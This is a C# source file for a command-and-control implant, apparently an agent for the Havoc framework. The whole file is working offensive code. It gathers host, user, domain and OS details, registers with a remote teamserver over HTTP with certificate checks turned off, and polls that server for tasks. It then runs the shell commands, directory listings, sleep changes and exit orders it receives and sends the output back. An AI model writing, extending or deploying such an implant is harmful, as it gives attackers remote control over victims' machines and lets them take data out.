using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Collections;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Management;

namespace HavocImplant
{
    // The Core Class for the implant. Without AgentFunctions/, it can only exit and communicate with the server.
    public class Implant
    {
        // Altered by build
        string[] url = Config.url;
        public int sleepTime = Config.sleepTime;
        int timeout = Config.timeout;
        public int maxTries = Config.maxTries;
        public bool secure = Config.secure;

        // Communication with Teamserver
        byte[] agentId;
        byte[] magic;
        bool registered;
        int timeoutCounter = 0;
        public Dictionary<int, task> taskingInformation = new Dictionary<int, task>();
        public struct task
        {
            public string taskCommand;
            public string taskOutput;
            public task(string taskCommand, string taskOutput)
            {
                this.taskCommand = taskCommand;
                this.taskOutput = taskOutput;
            }
        }

        // Registration Properties
        string hostname = Dns.GetHostName();
        string userName = Environment.UserName;
        string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
        string IP = getIPv4();
        string PID = Process.GetCurrentProcess().Id.ToString();
        string PPID = "ppid here";
        string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
        string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
        string processName = Process.GetCurrentProcess().ProcessName;
        string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");

        static void Main(string[] args) // Looping through tasks and stuff
        {
            Implant implant = new Implant();
            Random rand = new Random();
            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            while (!implant.registered) implant.Register();

            Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
            Console.WriteLine($"Implant will consider {implant.timeout / 1000} as the timeout");

            while (true)
            {
                Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");

                string cumalativeOutput = "";

                for (int i = 0; i < implant.taskingInformation.Count; i++)
                {
                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                    {
                        Console.WriteLine($"Shipping off Task ID {taskId}");
                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
                    }
                    implant.taskingInformation.Remove(taskId);
                    i--;
                }
                string rawTasks = implant.CheckIn(cumalativeOutput);

                // Chunk of 4 = size = there is a task that is being sent to implant
                if (rawTasks.Length > 4)
                {
                    int offset = 0;
                    string task = "";

                    // Parsing the raw request from teamserver, splitting task into dictionary entries
                    while (offset < rawTasks.Length)
                    {
                        
                        int size = BitConverter.ToInt32(Encoding.UTF8.GetBytes(rawTasks.Substring(offset, 4)), 0); // [4 bytes containing size of task][task]
                        Console.WriteLine($"Task is of size {size}");
                        if (offset == 0) { task = rawTasks.Substring(offset + 4, size).Trim(); }
                        else { task = rawTasks.Substring(offset + 4, size).Trim(); }

                        List<byte> cleaning = Encoding.UTF8.GetBytes(task).ToList<byte>();
                        cleaning.Remove(0x00);
                        task = Encoding.UTF8.GetString(cleaning.ToArray()).Trim(); // Clear up the funky

                        Console.WriteLine("Task is {0}", task);
                        offset += size + 4;

                        int taskId = rand.Next(10000*10000);
                        implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
                        Console.WriteLine("Task has id {0}", taskId);

                    }

                    Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);

                    // Parsing the commands from the dictionary
                    for (int i = 0; i < implant.taskingInformation.Count; i++) 
                    {
                        string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;
                        Console.WriteLine("Read command: {0}", command);

                        int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                        Console.WriteLine("The ID is: {0}", taskId);

                        switch (command.Split(' ')[0])
                        {
                            case "shell":
                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
                                shellThread.Start();
                                break;
                            case "goodbye":
                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
                            case "sleep":
                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
                                sleepThread.Start();
                                break;
                            case "ls":
                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
                                lsThread.Start();
                                break;
                        }
                    }
                }
                Thread.Sleep(implant.sleepTime);
            }
        }
        public void Register()
        {
            magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
            agentId = Encoding.ASCII.GetBytes(random_id().ToString());

            string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(agentId)));
            byte[] agentHeader = createHeader(magic, registrationRequestBody);

            string response = "";
            while (!response.Equals("registered"))
            {
                Console.WriteLine("Trying to register");
                response = sendReq(registrationRequestBody, agentHeader);
                Console.WriteLine("Response: {0}", response);
                Thread.Sleep(sleepTime);
            }
            registered = true;
        }
        public string CheckIn(string data)
        {
            //Console.WriteLine("Checking in for taskings");

            string checkInRequestBody = "{\"task\": \"gettask\", \"data\": \"{0}\"}".Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
            //string checkInRequestBody = "{\"task\":\"gettask\",\"data\":\"{0}\"}".Replace("{0}", BitConverter.ToString(data));
            byte[] agentHeader = createHeader(magic, checkInRequestBody);
            string response = sendReq(checkInRequestBody, agentHeader);
            //Console.WriteLine("Havoc Response: {0}".Replace("{0}", response));
            return response;

        }
        public byte[] createHeader(byte[] magic, string requestBody)
        {
            int size = requestBody.Length + 12;
            byte[] size_bytes = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
            if (BitConverter.IsLittleEndian)
            {
                Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
                //Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
                Array.Reverse(size_bytes);
            }
            //else Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
            Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + agentId.Length];
            Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
            Array.Copy(magic, 0, agentHeader, size_bytes.Length, magic.Length);
            Array.Copy(agentId, 0, agentHeader, size_bytes.Length + magic.Length, agentId.Length);
            return agentHeader;
        }
        int random_id()
        {
            Random rand = new Random();
            int id = rand.Next(1000, 10000);
            return id;
        }
        string obtainRegisterDict(int id)
        {
            Dictionary<string, string> registrationAttrs = new Dictionary<string, string>();
            registrationAttrs.Add("AgentID", id.ToString());
            registrationAttrs.Add("Hostname", hostname);
            registrationAttrs.Add("Username", userName);
            registrationAttrs.Add("Domain", domainName);
            registrationAttrs.Add("InternalIP", IP);
            registrationAttrs.Add("Process Path", "process path here");
            registrationAttrs.Add("Process ID", PID);
            registrationAttrs.Add("Process Parent ID", PPID);
            registrationAttrs.Add("Process Arch", "x64");
            registrationAttrs.Add("Process Elevated", "elevated status here");
            registrationAttrs.Add("OS Build", osBuild);
            registrationAttrs.Add("OS Arch", osArch);
            registrationAttrs.Add("Sleep", (sleepTime / 1000).ToString());
            registrationAttrs.Add("Process Name", processName);
            registrationAttrs.Add("OS Version", osVersion);
            string strRegistrationAttrsAsJSON = stringDictionaryToJson(registrationAttrs);
            string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
            return strPostReq;
        }
        string stringDictionaryToJson(Dictionary<string, string> dict)
        {
            var entries = dict.Select(d =>
                string.Format("\\\"{0}\\\": \\\"{1}\\\"", d.Key, string.Join(",", d.Value)));
            return "{" + string.Join(",", entries) + "}";
        }
        public string sendReq(string requestBody, byte[] agentHeader)
        {
            bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
            {
                return true;
            }
            Random rand = new Random();
            string responseString = "";
            ServicePointManager
    .ServerCertificateValidationCallback +=
    (sender, cert, chain, sslPolicyErrors) => true;
            //if (secure) System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(AcceptAllCertifications);

            var request = (HttpWebRequest)WebRequest.Create(url[rand.Next(0, url.Length)]);

            ArrayList arrayList = new ArrayList();
            arrayList.AddRange(agentHeader);

            string postData = requestBody;
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            arrayList.AddRange(postBytes);
            byte[] data = (byte[])arrayList.ToArray(typeof(byte));

            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            request.Timeout = timeout;
            try
            {
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();

                byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                responseString = Encoding.UTF8.GetString(bytes);
                if (responseString.Length > 0)
                {
                    //outputData = "";
                    timeoutCounter = 0;
                }
                Console.WriteLine("Setting counter to 0");
                timeoutCounter = 0;
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                {
                    var response = (HttpWebResponse)ex.Response;

                    byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                    responseString = Encoding.UTF8.GetString(bytes);
                }
                if (ex.Status == WebExceptionStatus.Timeout || ex.Status == WebExceptionStatus.ConnectFailure)
                {
                    timeoutCounter += 1;
                    if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
                }
                Console.WriteLine($"status code: {ex.Status}");
            }

            //outputData = "";
            return responseString;
        }
        static string getIPv4()
        {
            foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return a.ToString();
            return "";

        }

        public static string HKLM_GetString(string path, string key)
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
            if (rk == null) return "";
            return (string)rk.GetValue(key);
        }
    }
}